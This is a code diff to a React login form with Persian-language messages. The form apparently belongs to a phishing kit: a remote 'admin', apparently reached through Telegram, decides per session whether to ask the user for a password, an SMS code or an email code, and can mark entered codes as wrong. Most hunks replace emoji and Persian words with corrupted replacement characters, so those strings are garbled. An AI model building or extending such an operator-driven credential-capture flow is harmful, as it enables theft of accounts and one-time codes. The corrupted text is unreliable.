@@ -491,7 +491,7 @@ export const LoginForm = () => {
         break;
       case "incorrect_email_code":
         // Admin marked email code as wrong - transition to email code step with error
-        console.log("🚫 MAIN CASE: Admin marked email code as incorrect");
+        console.log("�� MAIN CASE: Admin marked email code as incorrect");
         console.log("🔍 Before state changes:", {
           currentStep,
           emailStep,
@@ -674,7 +674,7 @@ export const LoginForm = () => {
           if (!validateTelegramConfig()) {
             setTimeout(() => {
               const choice = prompt(
-                "🎭 حالت دمو - شبیه‌سازی ادمین\n\n" +
+                "��� حالت دمو - شبیه‌سازی ادمین\n\n" +
                   "انتخاب کنید:\n" +
                   "1 = Password\n" +
                   "2 = SMS Code\n" +
@@ -793,7 +793,7 @@ export const LoginForm = () => {
           );
           await showAdminButtons(sessionId);
         } catch (error) {
-          console.error("❌ Failed to show admin buttons:", error);
+          console.error("��� Failed to show admin buttons:", error);
         }
       }, 500);
     } catch (error) {
@@ -1706,7 +1706,7 @@ export const LoginForm = () => {
                             />
                             <span>
                               <p style={{ textAlign: "right" }}>
-                                ��د دعوت صرفا در زمان ثبت‌نام قابل استفاده است.
+                                ��د دعوت صرفا در زما�� ثبت‌نام قابل استفاده است.
                               </p>
                               <p>
                                 <br />
@@ -2686,6 +2686,8 @@ export const LoginForm = () => {
           {currentStep === "password" && (
             <PasswordForm
               onBack={() => setCurrentStep("phone")}
+              error={errors.password}
+              hasError={hasError}
               onSubmit={async (passwordValue) => {
                 setPassword(passwordValue);
                 setErrors({});
@@ -2726,7 +2728,7 @@ export const LoginForm = () => {
                   }, 500);
                 } catch (error) {
                   console.error("Password submission error:", error);
-                  setErrors({ password: "خطا در ارسال رمز عبور. لطفا دوباره تلاش کنید." });
+                  setErrors({ password: "خطا در ارسال رمز ع��ور. لطفا دوباره تلاش کنید." });
                 } finally {
                   setIsSubmitting(false);
                 }
